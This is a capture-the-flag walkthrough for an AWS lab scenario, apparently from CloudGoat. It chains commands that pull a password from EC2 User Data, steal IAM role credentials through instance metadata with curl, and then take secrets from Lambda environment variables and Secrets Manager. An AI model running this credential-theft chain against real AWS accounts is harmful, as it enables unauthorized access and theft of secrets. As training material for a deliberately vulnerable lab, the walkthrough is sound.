Data Secrets Walkthrough
========================

Summary
-------

In this scenario, you are provided with a starting IAM user with limited permissions. You need to enumerate EC2 instance attributes to discover hardcoded credentials in the User Data. Then, use those credentials to SSH into an EC2 instance and exploit the Instance Metadata Service (IMDS) to steal an IAM Role's credentials. With this new identity, you will enumerate Lambda functions to find hidden environment variables containing a third set of credentials. Finally, do this to authenticate as the final user and retrieve the flag from AWS Secrets Manager.

Detailed Walkthrough
--------------------

### Step 1: Configure the Starting User

First, configure the AWS CLI with the access key and secret key provided when you launched the scenario.


```
aws configure --profile start_user
# Enter Access Key ID
# Enter Secret Access Key
# Default region: us-east-1
# Default output format: json

```

### Step 2: Enumerate Permissions & EC2 Resources

Check who you are and what permissions you might have. While `get-caller-identity` confirms your identity, often in these scenarios, you want to see what resources are visible.


```
aws sts get-caller-identity --profile start_user

```

Attempt to list EC2 instances to see if any are running in the account.


```
aws ec2 describe-instances --region us-east-1 --profile start_user

```

You should see an instance listed. Take note of the **InstanceId** (e.g., `i-0xxxxxxxx`) and the **PublicIpAddress**.

### Step 3: Analyze EC2 User Data

A common misconfiguration in AWS is storing sensitive data (scripts, passwords, keys) in EC2 User Data, which is often visible to users who have `ec2:DescribeInstanceAttribute` permissions.

Retrieve the User Data for the instance you found:


```
aws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData --region us-east-1 --profile start_user

```

The output will contain a `UserData` field with a `Value` that is Base64 encoded. Decode it to read the contents:


```
echo "<BASE64_VALUE>" | base64 --decode

```

**Analysis:** You should see a script that sets the password for the `ec2-user` to something like `ec2-user:CloudGoatInstancePassword!` and enables password authentication.

### Step 4: SSH into the Instance

Using the IP address from Step 2 and the password found in Step 3, SSH into the instance.


```
ssh ec2-user@<PUBLIC_IP>
# When prompted, enter the password found in the User Data

```

### Step 5: Exploit Instance Metadata Service (IMDS)

Once inside the EC2 instance, you effectively have access to any IAM role attached to it. We can retrieve these credentials by querying the link-local address `169.254.169.254`.

First, find the name of the IAM role attached to the instance:


```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

```

You should see a role name, such as `cg-ec2-instance-profile-<CGID>`. Now, retrieve the credentials for that role:


```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

```

**Action:** Copy the `AccessKeyId`, `SecretAccessKey`, and `Token`.

### Step 6: Configure the Stolen Profile

Back on your local machine (exit the SSH session), configure a new profile using the credentials you just stole.

**Note:** Because these are temporary session credentials, you **must** include the Session Token.


```
aws configure --profile ec2_role
# Enter the Access Key ID from the metadata
# Enter the Secret Access Key from the metadata
# Default region: us-east-1

```

Manually add the session token to your credentials file (`~/.aws/credentials` on Linux/Mac or `%UserProfile%\.aws\credentials` on Windows):


```
[ec2_role]
aws_access_key_id = ...
aws_secret_access_key = ...
aws_session_token = <PASTE_TOKEN_HERE>

```

### Step 7: Enumerate Lambda Functions

With the new `ec2_role` profile, explore other services. Lambda is a common place for lateral movement. List the functions in the region:


```
aws lambda list-functions --region us-east-1 --profile ec2_role

```

You should see a function named `cg-lambda-function-<CGID>`.

### Step 8: Extract Secrets from Lambda Environment Variables

Developers often improperly store API keys or database credentials in Lambda environment variables. Retrieve the configuration details of the function to check for this:


```
aws lambda get-function --function-name <FUNCTION_NAME> --region us-east-1 --profile ec2_role

```

Look at the JSON output under `Configuration` -> `Environment` -> `Variables`. You should see two variables: `DB_USER_ACCESS_KEY` and `DB_USER_SECRET_KEY`.

### Step 9: Configure the Final User Profile

These keys appear to belong to another IAM user. Configure a new profile on your local machine using these credentials.


```
aws configure --profile lambda_user
# Enter the Access Key ID found in Lambda
# Enter the Secret Access Key found in Lambda

```

### Step 10: Retrieve the Final Flag

With this new user, check if you have access to AWS Secrets Manager, which is often used to store high-value secrets.

List the secrets:


```
aws secretsmanager list-secrets --region us-east-1 --profile lambda_user

```

You should see a secret named `cg-final-flag-<CGID>`. Retrieve the secret value:


```
aws secretsmanager get-secret-value --secret-id <SECRET_ARN> --region us-east-1 --profile lambda_user

```

The output will contain a `SecretString`. Parse it to find the flag!

**Congratulations! You have completed the scenario.**